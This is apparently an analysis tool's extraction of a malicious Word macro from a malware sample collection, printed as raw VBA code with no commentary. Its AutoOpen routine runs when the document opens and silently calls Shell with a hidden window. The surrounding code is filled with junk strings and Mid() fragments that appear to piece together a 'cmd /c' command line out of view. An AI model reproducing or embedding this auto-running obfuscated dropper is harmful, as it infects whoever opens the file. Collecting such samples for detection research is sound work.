Filename     : ./macros/dbf59825f4af6afb1640ded288844e5227108887a9dae54d01845f2a97959e1a
OLE stream   : Macros/VBA/wzjGLjIMpv
VBA filename : wzjGLjIMpv.bas
----------------------------------------
Attribute VB_Name = "wzjGLjIMpv"
Sub AutoOpen()
RnrQiibuWFi = Array(("hakILpRRkzX" + "aHKHimrX" + "KHPfpAaLbjTQia" + "bGLqmEpTPiqW" + "TQjNHjWTUd"), ("oqGJQEswhb" + "XbBlsVnzzzi" + "rLwFJuDQ" + "dpBvzjDL" + "uosnsIMVrBfVf"))
JjOwTzjCdL = Array(("umApupkoHE" + "OETotnCCklzSr" + "jijMFsLh" + "zWLfzLvhY" + "UUKiiFwza"), ("ozTIdKHBcBM" + "hqVShHFqoDZ" + "XsYDEGJ" + "kGZACDCmEuFWF" + "mTIMYotjlkXSk"))
mDwVsTtbRVQd = Array(("TluwCvj" + "EurhUwA" + "ocjTQAAzji" + "zLCnwvjazqlV" + "DfhJEnXUsH"), ("tjKoTlzPYJj" + "CHvmlYDdCHLPkT" + "svGQFDZtPkuHM" + "WwNUliCJBlwod" + "mUuDztFUStd"))
cNfBqQqkjKwvz = Array(("pjuVUQazGvqrH" + "nCiUqvCod" + "ufwtubWzELEWaw" + "NQcGkLzJXw" + "jdEElAFuaoR"), ("FfYqmwORchud" + "ZhsnvWbwQvs" + "AZEQfWlvjXbLVM" + "JfBzibZMT" + "GiRqjokj"))
mWKAwKJhvBFhSi = Array(("RRPvJTaN" + "EYrTEAirfZaq" + "fEoZtiKNfnwIYR" + "oWcLIZwXTq" + "uTOCtHSSmKH"), ("ZwDXYlvLfiJD" + "wPiaijVi" + "jrwduopGf" + "jmDOFBXmY" + "zMKLtwsksDd"))
BINLYvqGVZCt = Array(("WtAcYLtwDS" + "hnjwvFNblu" + "uBtcbwRJYJQo" + "CsHTskpwqq" + "kMsKPLbIclz"), ("ivjzftuMQzLvDz" + "jAEmELOsPEHuNi" + "LmCuYYIm" + "EvdNlAwH" + "RrHXwvnTD"))
tXzjiJoZtJ = Array(("VaOuiIhBHO" + "zcwqznoH" + "EVntmEOz" + "wbCwsvR" + "dPmFSwFkYXknKA"), ("lCUAmUIdtiwK" + "FBjAZFKYUBmZi" + "OhiMuwqR" + "YviZVmtXWlSfWo" + "NEqLQBibELtw"))
WCNwoFKFv = Array(("pmbdPnPdrtu" + "pGiAuqTZNbpiAU" + "VqRdiSYBZp" + "SnohCDUXMH" + "nKTlVSNwz"), ("vPumZPQjRFF" + "XYfkjYmJ" + "HRDDHKswGnc" + "uWYuudnErvBMc" + "vGklpJnAowrj"))
VBA.Shell$ ABtGcRvk, 0
FYjLSdTdB = Array(("qmvwFlMP" + "aUOlMUwSDtiaD" + "KifHkjjJ" + "uzuztKiO" + "iBJwqmXqUKP"), ("TjnbkQZdcjGR" + "UmSUEHVf" + "rCBMstkt" + "ZtZbSGYJu" + "kzCurnWz"))
WPDtEMo = Array(("ZXXjtjRhXltU" + "wvMNuHpH" + "ZVtiWzWz" + "OdVwlWbrQk" + "TBciuaUqj"), ("FzdQzCmO" + "RLYPirqz" + "plDqEupX" + "OkwifSLJirinU" + "cESBvlwnDcLAv"))
OujaZJYi = Array(("nfFEUMzPV" + "wamlsumubh" + "TfXEvkHINL" + "wofWqhdaE" + "pfwjbIrjn"), ("wzuTAhAZc" + "HHJjcwFWEFRAc" + "dzZXTbQc" + "zTAtMVIjDwM" + "hWSDdCU"))
izwUnpBIcFA = Array(("fhMMbEtBwYN" + "QBvdGUq" + "vArzXjGWUz" + "wzkaAKG" + "YITfKkuDmtX"), ("IObffqM" + "vwWjwUOEjavTA" + "SQcUhPdcTdwzv" + "WEvKwRjammip" + "pXLzEBQwKD"))
End Sub
Function iEShNGBWKEiB()
DzHqOBiN = ("pWlbqwjEFL" + "wlLdoiOwKYz" + "OPYsnbjiiGjZqE" + "nNfSoRnFM" + "bQJDicApZXMS" + "tcZcsqB") + ("njRajiGLfbJM" + "LLWfAdjj" + "jDVKmqPou" + "KAojrczwt" + "uwDFwhRCwsM" + "BWDOFYsQv")
ELLInNZzTw = ("oUzCTto" + "vwFuKokLw" + "PirpSVDKqDZzM" + "VVmsVZwhLiDIBT" + "dJMNnOqJz" + "bwIDlqw") + ("GZoBsqXuiSJm" + "TjwNtMmZ" + "iLnptapdarGW" + "uZbRWpsjYANtIP" + "psdJMWuc" + "CzzEEsRfm")
AkDRDCXzGuj = Mid("jaKGSjMWoZmwlHzz/mojN", 17, 1)
nwBiACZCAB = ("juBGWiiDBfpFW" + "APOEYMrCCswS" + "dWaGdiDQIDp" + "mYtrhcwA" + "OpJnrjwds" + "IEABjaZL") + ("SUrLZtlowL" + "PBRKPjRSmw" + "mQujGlW" + "QIRZhwWij" + "FvASXtGmqmzIGZ" + "OibRsmARku")
UzMKzXErKEP = ("mPHojLj" + "blJPSrpRd" + "XsiVAtvK" + "YDXPbFSoLVFcT" + "bEAlvdJsWHUl" + "RRPNsVUHLEWiJz") + ("ivXjEIH" + "AHAhhfjQu" + "LAXwIMGwdPAdD" + "dGOaklhlKAOF" + "onbiocszzfinK" + "FfrQWEODaRF")
sFNNMYOaoJ = ("wbkMsChX" + "DDTsAZTvkOHB" + "CTQvNqHFdQYLv" + "CdtwbisUKPi" + "STEhWmKGZ" + "wzpqQbZnu") + ("FvRSrRjTziI" + "MzXoBwt" + "BoFkjvHkSQuX" + "CKXBlpFFqH" + "IvlsSbactIiRp" + "lvKvAinljJm")
jtESbUzXAji = Mid("NjbGjnPZe elaGzRFwU", 9, 3)
jbcYnL = ("JIaqWhCURLB" + "MBLoibfnZHbG" + "ksBikMKYI" + "kXIIBkqLu" + "FEUtaZwmSGB" + "TWmoBpjwqMDi") + ("QVSdDiwhcNf" + "HDLOXGCRDD" + "WNiAivmtAlSJ" + "jIOXEzq" + "GQulVkTF" + "RXNjwQU")
MwzcBj = ("wOTRcPRY" + "pLrqCKh" + "QjVImuAWPuP" + "uMSSvcijSp" + "oHdGshoRsBj" + "zfzKUTuMVCB") + ("csZuZjBL" + "DjAJnHpbcXW" + "kTnwSJMYd" + "mGUdAIts" + "AVAvwwBh" + "FlsfivsZ")
ABwSYZwZD = ("RmpUflpuHiPs" + "MEMdQwoPIKT" + "wUuwUjrupmMBo" + "fErOCENXFTA" + "fUjSJbV" + "jRuwnwXwoZr") + ("opQjXuIP" + "bPbvOEXNWdl" + "IuNKsaEhPif" + "oRpDwuOTGFF" + "SCYtzkR" + "GjfvDZfTDiLsjA")
KqtiTP = Mid("EfYaMwrFsvuOjzAejAwQUGldHJAVkYwFqJfqY", 16, 1)
QGptbq = ("wHWonztutoKH" + "hkKWsjXozQcB" + "sRHcYkbVv" + "pMhCCEFMWDXE" + "UIDIBzBq" + "mUFbmRQZjLlzUJ") + ("jUksEFzv" + "JmTVbZYuuvZNz" + "RnwzXMSIzwt" + "jNIlooYRRAz" + "zHnrFYkwjtTEHI" + "iVBnVczsKlI")
hNZShGjb = ("rkwmUmfY" + "tqAQuRbXz" + "vbIlhMjJqhM" + "EawRdcHiGMrmjA" + "pZBIFHT" + "jjzPZld") + ("rBzmZUcozQPUi" + "VFjGujoYGmkZ" + "idMhwdXz" + "jOjVwMJpszSw" + "tjSrtATvN" + "zHuLmiS")
avdtqi = ("kojJRqBz" + "YbCaOwtnt" + "ifOpvPM" + "SzOcFzRzHCj" + "OGIKKuw" + "HfGFRhic") + ("wluEOjBBwV" + "JOoqDrq" + "WDfARATmrJ" + "YTocJRpz" + "XGJNZtDsrQBZrG" + "TTkdEuw")
dJsMQ = Mid("ENBVthJhvwAAswzqsJGcEnZHPD BznvpjD", 27, 1)
VXkTcQBVRbw = ("LkkZSaYncORul" + "NUjdOEjX" + "pSMjNBBXGZH" + "OcURsSGX" + "dTPstZb" + "TNHoEvGF") + ("KlbrKUdAzrPLWm" + "zcMzzoUbaNn" + "ASJhNMzH" + "vMSwmrtiLz" + "biociHIFqJBdXJ" + "iqJBzWiIDPt")
OuLYkVA = ("EOVOEaUaUDuvp" + "psfBncvA" + "lciwCcltYEn" + "rUAMaIpUROQ" + "BKjurmTwEk" + "ladSwiJVqBkw") + ("ipNTFfNWME" + "rvrCllpVHkPlwq" + "lIsZYRMIPCZzs" + "WNYWibCrHk" + "LProPDQ" + "NtEdnjdinbA")
GRtWHvTbTBJ = ("KwbtOQp" + "WdhzGEtRLuiu" + "IJCYJwazVlMoF" + "IOPmNiaHEJKuvd" + "zJjzMBmY" + "ESOlBsUKBG") + ("CvHVMOBFtOOC" + "kXcfpsvWpvivTo" + "LoztosJ" + "BLmwAhf" + "pPRBdQo" + "ILOMAZatav")
zRtVw = Mid("uhflwkQbQZYFnVkXzBtQcQsPLphEpYQ", 27, 1)
UOOmsZH = ("lzwkWqPN" + "puAIUMBVU" + "wIWifRklpFwOPH" + "TOSGRYnDOY" + "EUSTbJTbBCPSRS" + "FaISaitjBwiO") + ("bLFIGfN" + "SVdnvnGWD" + "BofTNvvwVKkQVt" + "RApzHMlEWmEiff" + "nNzChaXHwJMHK" + "iCAksin")
Ebwzh = ("tUMfcMwVjrSjE" + "DVmivBPKWX" + "ETWYBaULnFvom" + "RRujjNDMzc" + "FJPicjzppX" + "cwhRwXQSIhzFd") + ("VapJlsUuBwQF" + "KWzzwCYozCO" + "jvjToFElz" + "IHfDfZiu" + "BttGwLiCDFvX" + "buFwnaNrLT")
sPVUkHJ = ("YwkQkIjIQ" + "TiXWTTLUu" + "rnvEbAskEumBD" + "oBSQpObptw" + "fjHijYYjuYlAj" + "jQwEVdSbAhRBv") + ("fRCuwPvUkBX" + "ORIwDAlcGw" + "lXSWEjZRfdu" + "dWqCQtO" + "vjzPASBiQPS" + "jnRXfsroKj")
fsNLiq = Mid("tKnHiDS AUEwdo", 8, 1)
zvTZTRzO = ("DNpTsWwGCSN" + "mpkIGDBfCj" + "jlwilHhspZOC" + "WOJjGoVFOXTG" + "SGoKndT" + "IiuoNwUZXwY") + ("ClstUZNOfSNfc" + "pbEfmliFNfPs" + "qAfqbvTAjOupO" + "FwqVPMiJt" + "sJmEwYMicf" + "OzcmkIiIMK")
iKRVKaZI = ("MJOaNmXT" + "rBtdfDPGi" + "ZfjdOAh" + "jYozMBZ" + "aFIoLRuMmvbOW" + "lRjzcbcjA") + ("flnvYrosEo" + "KwuuIkWqTZS" + "TnWQNYzOuFj" + "aizouGiK" + "nbTpFTqFpjzM" + "UICbbTGa")
oSzliQqpfBL = ("YVdJXKAjPhGLz" + "IPDICQNis" + "wOjfDvAjKDlRb" + "BBdwQpHoiUbti" + "KtcpdlM" + "bUcTjZAu") + ("qoQGAmQSCjI" + "ODKQAWQawopb" + "aITwJinjplFOt" + "HLWaCEYN" + "SCfDkUiCw" + "OadwVsBUAYSFB")
XwbpouFjiX = Mid("t %zWPCiwGsDPJZEZinLKvdYzVO", 2, 2)
vRTkKrtCp = ("EPlUiliwNqIz" + "LCaIFHIFYjw" + "JrlSiODHF" + "EEkpFWsTJE" + "owzATOzS" + "jjpBUtzdibF") + ("apwWXPBlMFZrJ" + "vlSLADocqY" + "jVLZPkizT" + "GBivzzjQa" + "zrwwLLW" + "BBwwaHntpMz")
fshKfiDTiB = ("JBFUjALCFrG" + "OAbSilXY" + "ATilbOicuK" + "qkoBmii" + "hjrUMKE" + "vijuBzHJ") + ("aiImcaKjFRdM" + "jAHQqkJwSa" + "EntNQwtdfT" + "vWUFJhnG" + "azWCjnkGXzjHI" + "hohwQGYAjGUE")
DvYwRVVztH = ("rspHokoQAF" + "LPRRrWNN" + "OHwRPIa" + "HFIUTFPFCr" + "bXGavsmi" + "qwWcwtGk") + ("YrjKRIvzosKCMp" + "DmjHjCYdZRf" + "ifVazfKd" + "iQFzfzEtYGdGrZ" + "MwDrzOGs" + "wMSTSKXBLjZV")
zfHQSLWdtzX = Mid("YnsVoVLfDguiiUEiNAMAmRdmNEWjLT", 10, 3)
wVYkBNa = ("wlabKLiwHRqh" + "NmFfjEnlmQc" + "WzTaQPicCoVz" + "ZwZnZXqOos" + "uBWQQzJUzqoL" + "WrBIFZZQI") + ("KIOzNsmW" + "GhfOtSLDiBzi" + "kKRiWiJOTVlu" + "HCBwbLTF" + "hqcIqtW" + "PJYZXDjiWDMTnL")
EYZQTtw = ("GmQdwuDw" + "RVfWqVYAIHQ" + "cbmNtLXqs" + "fJWdjHsmBjPLiT" + "jNMptFBbtiK" + "PCjfFkTqVzN") + ("RIVFkDRtTmKzK" + "zsdhdwW" + "ckRAJaPcFkz" + "XlkvrqNQKd" + "lUElaMnWPSofk" + "jtqirjZwmdNIi")
QMjNGQ = ("UhKIBiZnOffdaF" + "rQrXGcVmj" + "URFIHlRWwIbjkV" + "pWKusZGZH" + "wcPESwua" + "hQTfHtNH") + ("znLfWKQFLsr" + "OszwLJBRiJ" + "FbowWrCAiScb" + "AQFEnMnBjk" + "YVivjMpAo" + "GEiOuOIs")
LpcDVlPHjw = Mid("lSCHWmnwSZrHjvNRcegejipP", 18, 3)
sViuE = ("mlFSzsjjFooPR" + "kFjFzHHzW" + "SwSnhaYRizjd" + "VjrHDnBp" + "OLNhuIJaipP" + "zDatwiQXk") + ("iHtNZHAEJV" + "rhGZAjPIEOuOtW" + "QNFJkSquhFn" + "jBaiftWIVUTz" + "AOjFktzqwqmzzk" + "AnZUMzjHikO")
AjPKqRtvdBf = ("obPvwGNIzwbhb" + "jSjLcJG" + "HpPhGFNDLJZ" + "tiBbCoRWTwVcHc" + "sOwimmKUZfPzH" + "unSHjMFQEInskJ") + ("TnZiNUoO" + "nIjKcwnoKaZ" + "DVaQnbJn" + "uBBLFrqVuaFYn" + "XdvoIVziKk" + "QSwNZtfaptGiwW")
XOklZ = ("XNHwuHLjDJ" + "wMoqnKnijIrHi" + "zkwUHCVWZcdous" + "oBaqwcHYItwqF" + "LfFYBuXMPwHT" + "nMNwQvnrHRR") + ("SrMqaLMPnNwX" + "szTclijfB" + "MvvjvSqDOo" + "iDLWpluEmZPph" + "zTPWniFQWz" + "fiRzzJiibKuIGw")
IEkkiUD = Mid("DkzAbNnjMzOIBG  nfjONQwJVKFrGMjTjJoEjIVfN", 15, 2)
PQowDV = ("zTPzUmQ" + "DnsnBSr" + "rQOpZrHU" + "azzaRvwRDYfS" + "QKzQvahF" + "IzhPRkhfFMv") + ("upSbmrvWz" + "LthADpIvjncvoA" + "CiMjYSTWsVVhp" + "jlijPmoh" + "jsWKfIpwA" + "ijNjnZbsW")
StNAiGIuP = ("HAwZGLVYXdWKAz" + "BNJthIWqVc" + "VrmjDsOAtHTjS" + "zZGdjcpIDKD" + "SbqlJbw" + "qdmqaivAG") + ("hhrShjPNl" + "zMobcDanJIwsjA" + "WmPDFhpCmdWI" + "uHVvpwS" + "oLOXEIrwSpz" + "jKwzJjSJKBwGu")
ovRAlP = ("iiHSmzBtPZNEU" + "jqBInOCXV" + "HZVCvGotR" + "lzlEYiGwiaEdP" + "DwYSEIlHNsLMcz" + "JlTnaciFzkFHGp") + ("KdJVzwhVpJHiks" + "LGHwYplqoXVrb" + "zAfRSihCGAwb" + "iiTwzNEYz" + "HQFYnVw" + "HGnpIbMRJLJ")
XdtMKraHTMS = Mid("Hc dAYnULitGHrYv", 3, 1)
zuFpU = ("sBmCCnhHibB" + "BZwDUoYRTjL" + "mJiISmNIcd" + "pMQmKJYcU" + "dfsLHhJhcGIpQQ" + "JYpvOtDXJIrDBN") + ("uHrYIdlz" + "EDaAXHAw" + "tBkjhFE" + "IiCQdITUMBw" + "HPXbiqLTCACIu" + "IMXLZlT")
KQJmpDb = ("juWqsQpfu" + "zwHWlZQ" + "dDKAOFw" + "zapkLYWak" + "zfjhGaqAlHd" + "jtMuJlCfjQtZQ") + ("pJuYcjmGb" + "UvzkJNUppLqw" + "ROlXEwhmHQ" + "khFMiwBdSbaNn" + "VSvDkFYtl" + "KrIiItwMfGz")
PTtXVvPu = ("VCuuauGfLFCE" + "ddJEqulXHjuVa" + "HwAbMYZtUjkPQM" + "pwFqLfjOHi" + "hKNWAYAuziKiq" + "SjIcTbdZASj") + ("fOUYitsUrPfwj" + "OVNpiSPK" + "vamnHOIJvnLtm" + "aARlVoCDKwH" + "HLLoQZUVZ" + "wGlGiFkKVScvmo")
jtlarDlB = Mid("fNDBjoNVd gHlilZPPhsupHRAZnZwm", 9, 3)
ibunm = ("HHKsJNdzrAz" + "ifliXKS" + "wcCnoTVYcNihT" + "LntrwKQnlJuDA" + "HQpUnIjiFXD" + "sFUdSPmoUzpfO") + ("bIrttlSs" + "MYNuKMjiV" + "FSKTIqiQLHKbJ" + "ihYnMiS" + "zoHEEVbcoP" + "rJqQoiCOU")
OjlLpRBX = ("JTGjOwNuq" + "VulwPjwmJosvYi" + "SioRFfMYjCw" + "XKKDBiFD" + "ZRFzzXnd" + "OubzwQZdlR") + ("WFtQUZbz" + "rQTbUsRiSGHY" + "GoDkXOudXtnupU" + "ofZwosizbA" + "EzrLiKjbwFN" + "CNFGTXfhfXtt")
wXAIftAjD = ("lGlPHPdo" + "WrVhSWLDmJpjS" + "HRwoQjFKPwQNiW" + "zFzowtbWbXtdi" + "FiYSLdzKa" + "EnMcWQEo") + ("OpDruWCfvVQXG" + "uJTrvWssmfk" + "IhzzLTFoQaCn" + "wJzBpJpwMRS" + "YJRwVCY" + "LNUjvKzR")
YJGmczLUu = Mid("zTTZPfC^GwQr", 7, 2)
iIjXicbJzj = ("jKkCYqbksKvm" + "OdKNVSbv" + "jilOawTzjF" + "YwzwZaOlzJDKUG" + "CWRBaRrI" + "CQJQfRsdpoo") + ("iMovEqvOj" + "RIRtwhfffj" + "XwIRwFiRZUfSt" + "KdGWbvuvdz" + "wlUKzKJ" + "aGPfdGkN")
DfZmwYdh = ("wwoEwwTsXIwq" + "qbhiWhpzh" + "VJTwfbIWGZr" + "ClwtphjiO" + "RhEZZwrjbm" + "UTvdAoROl") + ("QXZYwjdrIODOw" + "ltGCMiawECiRD" + "osSQcfBJi" + "cQOoTYL" + "UDrGiPB" + "RSTXqicN")
zrnhV = ("GDmpYVmEZJDlvc" + "JQzTNGcKV" + "TRuzcPri" + "pZNKaQiGYAFWii" + "WNGQzqitQfFDrG" + "tMDzntwFYDfADJ") + ("oonwaOJbi" + "LjwfVMrz" + "HtTjrDaHiMU" + "ajzqQPsfikkUq" + "NzZDqnAcCXV" + "wuAGbONR")
lFAMkDPCW = Mid("JSpfwbkAia  ikqlWOtNHjlcRRR", 11, 2)
PtUiNHuPi = ("PwnlTqc" + "FZwPlijqc" + "zYiKCOVNjqHKzn" + "lDcYUBN" + "rcpFrjnmj" + "hcpUFtYPF") + ("lHucIOzb" + "SHwmIqi" + "IihvDawPL" + "QwizFvFd" + "hMzcjLiOGlpj" + "WfQlXLihzMz")
oAisHSdw = ("CSkqPzwu" + "akqcZJcIPWlB" + "ViBOsSvG" + "QIsDBFZajzzSY" + "dZziGiGfjKtzB" + "BHjzfnUijVIXj") + ("qoCqwtXosnobh" + "chKDEkYYQzml" + "vqdWjvRosI" + "AIRMOtK" + "FjGBLES" + "QRYCDLXcwORFjQ")
ZuNnStbztNj = ("icVSCAj" + "HAALBBjVLqi" + "jnbDjTYuvB" + "AAazjNvDlIAW" + "iEjVbNVHib" + "vBSiicmkFQ") + ("LaDAHPn" + "MfQFYfjCSijcR" + "FBivNUIWQR" + "itJRbFG" + "pPpfwtDzaU" + "ZninVBS")
vjUjDsM = Mid("kmmhJziQqnjAzlVruwcPVDWEzjnNzcmiUjGNJnXa", 30, 2)
IhsSanIN = ("jZHDwTMKXpjfmp" + "RSQzBWTFwokpO" + "cEWpnWcDAWiEHA" + "UflmKwwo" + "PZQTJOLizKvk" + "qzTLORtS") + ("PTtiJzCECdPnaN" + "IulLAGw" + "cHplTwi" + "vQSKzaiFLctH" + "UZPlNDTji" + "qSNRWTNjG")
tsDlPI = ("vMQqorr" + "RJsXNUHGOAE" + "PqFlwDEb" + "cjnLQfb" + "aaGbRwswaJLJ" + "knqdlFGiuknP") + ("odFLzpjVna" + "hztMmVusRTstwh" + "ZUGjpTLvIPs" + "LWcQwMtwn" + "tsYqvzCv" + "JiTPLPHliVCl")
oswaEz = ("wUWIDJiPfA" + "NpnHiZAGvP" + "NwbrjJI" + "ztmnVACHhEUD" + "iuddaKo" + "NdLEwHYjMZZHtC") + ("aBSGjRTBaMz" + "DwOIzUskPbj" + "tiaViuvHfP" + "bIDHcub" + "szcUiwQanBRO" + "StNCqzXjQrznvm")
CUJpObwWz = Mid("qJDmDwiuwTZQZz", 7, 2)
SFHTB = ("tHiVpDvhDkqOaN" + "wYNsMjjj" + "HRBoaPalawwQI" + "IzACFtcBlB" + "mFIKZQJXpOYBGG" + "KFodPqqzEsMdd") + ("QFfAonJSbAfot" + "KkztvSjXN" + "lJwGDRMn" + "hZJsBRTirdn" + "azYoUvSiLGssYO" + "rDPKosIMsBs")
fhQUTu = ("hRbNoidUV" + "SFiTnmzIOTbaCA" + "nziGOcDi" + "XObivhjp" + "ZFaEDZccdJ" + "rHObBBhuNH") + ("PbVwZLTMhm" + "BdvmitJdmztF" + "PzAdtzmbR" + "qwiHARI" + "blFGlfOTo" + "jVVVVEjZKpSi")
wjljjvjQ = ("bcnrtaJKLXRjVu" + "UahRTnl" + "bcTzESljnbz" + "GYPwROEUTljot" + "omLkZIqAMPabE" + "ariHWDwvLizEi") + ("IpviFQdzU" + "CqAFLzY" + "KLtcGYSpqsack" + "ZYsWUvVoOb" + "bFfDskMJJu" + "XfjXMPalYs")
GvvPub = Mid("ULVswXWqtbrEsn", 3, 1)
whuIwbkWhUP = ("KkYFnzm" + "MdiSTMJO" + "OaLBrwjUdi" + "aGTwtluVMab" + "CbXrmDBrWL" + "asXzTnpkJULjF") + ("kYiRnBtn" + "JaTEwRbm" + "PQsFWlb" + "XqRwrsRhCiTa" + "JwnlNZzjsTih" + "TpRiCzqG")
mfJwGiW = ("zPVCpdjDDRtn" + "WzhPNiacoMWH" + "fjJVQbiVXcsGQ" + "IDcnahShWd" + "fRvIKCzuw" + "zuiARJOzVoJzNS") + ("MYvZawKfDl" + "iNMZsLTX" + "ItnIYDhA" + "HhDdjwdEUVzpP" + "PHaBnvwwdqK" + "SlnAXRJqv")
bDtOXNEPw = ("DVISiCXumIM" + "FTFUIMbwfW" + "QjYcQXcWjcjs" + "dvqzMwjaV" + "OWLKukOHwjmr" + "KZGWKmcsZanr") + ("VimjqJvz" + "GEMilVVh" + "flNjXFbW" + "stpvXThPjVSqd" + "kATBKcAHWrOIFw" + "HjFUVDEUKjtAW")
drRLThvGuzE = Mid("Dc  jipFOUMbSEzqvHoISI", 2, 3)
FjFoiKh = ("GFiNwoq" + "YStOXAwBuEsJEM" + "SjrQTwhfY" + "MBVXZzHHfSrX" + "NmCVXFw" + "ztmMhEXWAqmV") + ("LzciUEkCYub" + "cdiRcKaZzMIiLs" + "kkfcEBXCnZrCAN" + "azLQEatFYfMv" + "wruScIARtRWt" + "brrkIZM")
EvUKKRiV = ("pJzrQPvTlFa" + "YiAzZjLM" + "NEizlSQCKQZuX" + "ljQDjpWwFDINpn" + "wPFipcEVtiziQb" + "AOBiPNJjcXRQz") + ("oYcdGLBUPiU" + "OWYlKGVQCuL" + "YjpjcGXL" + "uFGUBKP" + "jwSNiwmHrMLvj" + "uMVEWWSrIK")
sqGmNwtpn = ("mJXunVqfH" + "sGpDvfYZrNShho" + "zwBOnXmjUM" + "WYonJmlUinPX" + "LLihwvEbiWoXpR" + "aFWUrNIAlE") + ("fwMKkja" + "CcoFkZH" + "oBAPUUR" + "YQvjhDKzcvPIPX" + "EwiPrlAlvjHU" + "kpiKiSlTotYwRr")
jAjSljUUk = Mid("VjSthowWkHUsIPb", 5, 3)
ZzQvtCBa = ("bUQSRJvF" + "WvstpkCbltM" + "VVLtwwntV" + "qIEHiVpZDPqHB" + "UcOmTqGOzsFwEZ" + "MILHiFkoi") + ("jmLqzaO" + "MZWhAZiibL" + "BfQQHrGi" + "TtjnjjnEuYzSri" + "zviImdAdZcjaP" + "DwrvOBTpjB")
OLNop = ("pdGkjFKSGzoC" + "BzRJZHsWMZiuAG" + "lYwjmztjrE" + "zmLXcYG" + "EGZjKGtKcDbqf" + "qhhwFPvIPZEUIG") + ("ozGoNCOM" + "ncspQjQOZAwdp" + "Tqrwqzcqwnw" + "GVCSwcUpLcXGr" + "JquIKhwTnzWF" + "MQziEqcauM")
EfwKQCPRW = ("mZnCLtJBYQ" + "MwrWSPKK" + "GXiqZIWccYKMdo" + "DMbOjWY" + "FrmsEsiDiZBNP" + "wcCWhYAFzjJrS") + ("owachjd" + "nPSkuVfmbblMPw" + "MpAqzrCj" + "ZcOiwZjj" + "wpmEwdiZN" + "iGFqpkOm")
nUvwjZL = Mid("pKTiONrnAUqdf wo", 12, 3)
pBpsNFWEii = ("DUIzTrSk" + "HqlwpdQ" + "niEwrEIZNzSQO" + "OimFqYwz" + "flAQWiAobZmmMH" + "LQAaFtzU") + ("wbHJkmsqnlYKr" + "mvNJrqbWBWbta" + "YuCfRJSuWr" + "ohwzajA" + "cOiskIdPbZ" + "hqMTSsisthUr")
GijXLzoD = ("LBvRjor" + "aPtMnImi" + "vDztVqdaL" + "qIJIQciOVC" + "JmEzICXasP" + "UCQSmIqKSq") + ("RABRHckEtQ" + "tmQsvMoFzTH" + "nGswpaYLkf" + "VDwqvvqnWEsJ" + "BuMdWMrEKjN" + "OiuiUFqN")
ZcTqwvvQEvj = ("VECIfWambY" + "JuCSXntqVkJObN" + "GsqGnHXEWfF" + "kFwwGRPKXp" + "VGniVpMqa" + "BPiwVlpmpjnSSJ") + ("WlDwMDGRbVAz" + "BPJpiajpQCl" + "ZYiJcCndtzE" + "tNruwGbV" + "MkaWwnsavGjS" + "nfXIwSMVk")
mwGcqOfEp = Mid("hIHzEj sdOfWQMi", 7, 1)
GSqZwqqwDdt = ("vpzWsKJ" + "kPvwOwvNupY" + "jLXjfjQvIBzBv" + "FENHdChYZQR" + "AhzRZQSZU" + "RQrMtNWjQuBl") + ("qAnLVGImHRQfj" + "rbiiWIVnwPQIUB" + "zXNPqJRmEwSMw" + "wajJRfIi" + "idVDDXvM" + "GwHuDQtmapdl")
fGlSMXoS = ("WfdTjLYPjrZaWc" + "FOscvOHr" + "EkjWoKnulvOs" + "WuqmBHnori" + "lILLaJh" + "ovPwbCbYE") + ("obNTjrzlINz" + "tMGiljw" + "UcOzEdHwPkZ" + "jJDDnRcUNpBT" + "kCCrsQvZb" + "MMOPCjBW")
GOzjzv = ("wWczpjz" + "WhRLilU" + "NOJjfFB" + "EXPQfES" + "aajwbFi" + "NkjPqjVi") + ("hNbUBYqVYt" + "UiXROMlHE" + "iHfwWvWmNU" + "krzrrkY" + "qdCLQri" + "RBdzNaDCF")
QiNBTr = Mid("DVDVauNiJMKFXObehqstjEaPvi", 16, 2)
PEjLLoC = ("nPUjJDvUDi" + "iaujTbEEW" + "iJHzrqZBZk" + "TdjzPSso" + "vrvNflSivbizzD" + "GNkSMWTi") + ("CLzOjEILQYYmO" + "TFYuFzGOTaWtBh" + "bbcNBKUnDur" + "ShbiWsTRN" + "bNjnorXrqCblo" + "wZMjwRUzOfnjsv")
hbWzTuiiKWz = ("WDCmjwLjbhZvOE" + "lDmInuoaaIoDzo" + "tWLXYoYwOAIT" + "ZMvkTEzWMMSC" + "dcdstNutoCjr" + "LNHYHfbGAON") + ("jtrLjKs" + "pKvSVHvYnk" + "LsntjOnE" + "abdNQoJTCiHrr" + "qARpCAkCTP" + "BLwAIws")
voiAhBXUM = ("BhQNmzP" + "OVcQMDorhsii" + "fkSvTbwBAHzbqp" + "KYBzjszNVA" + "vZnFoOND" + "zwRTXQfOOd") + ("VOUjIrjBEiWwu" + "jZNuTlOm" + "XMGiZQNjzs" + "mhFHzwhL" + "naBXHrrRUusaiu" + "TCIHlqwXEiZwUG")
NiCBwmUDEJc = Mid("kRCAbfViDtwhptzizQTpCXHzXQNi   AjIvEijQ", 29, 3)
ikUbYk = ("FuNhiBh" + "bWFcSUVwsSZlDD" + "INJPcMTulP" + "mcdTjnVDJjOm" + "jpAIqXHCBWET" + "mFkHbTNhit") + ("ZilPAurub" + "imMLENHikG" + "zKBQSBEuZE" + "whiHmrBHiKsADS" + "wXGGwwmuZX" + "zisnABSlpfcw")
OHiXwwZS = ("JpPIwAn" + "KJiIuXsKOJKIi" + "lKXGTPzv" + "BDLAAKc" + "wKhFFrMDQcMNOf" + "XADEkrhXrO") + ("hEiXrzm" + "MzzDfTLC" + "mkirWjn" + "wGrGRmqqBKHUtk" + "aDSZazYlZ" + "dlHjMKYvXutvE")
XRYzzIMQkkW = ("PjcbOHJwztF" + "oSGzJmJjCsTP" + "KqhRctTairRWL" + "RNkBonGLjMmf" + "SNZWNNkDRbhUA" + "FJbodwGsVRqi") + ("lwHVfwAANFU" + "IbcAlDh" + "BACHXJhmasHji" + "zFKGBXzlsEHk" + "XdrjNJqakw" + "zWPOaVznVXbXqf")
EdOkt = Mid("TMhGzhjHKMzidNDZicnggdRMc", 20, 2)
UpADO = ("KHMiIDhKCXHnDH" + "CYURRnBiK" + "zjZVpTfzXOTku" + "VHTjkYYHQiV" + "ZdnHJYCoJU" + "oMDcoftt") + ("irvJTSwlR" + "TrzTuCLQEuhFT" + "ziWjwjc" + "oErhhdnrZR" + "RBQpsJadOo" + "jZXuKpvSphPvCv")
CLREuaso = ("kjLaTPwWSv" + "izsJlEDECGosm" + "PKZbaOQfjsISv" + "jXGDAuNbzwPV" + "wsRvrZmDEZus" + "YzOzASJWYizk") + ("rZnNdMEdUnRzR" + "JdbwLLTVONzvw" + "OYNSKzhM" + "rvinDELzC" + "ZAszfnZYWLaP" + "PrPvZzmRLwNj")
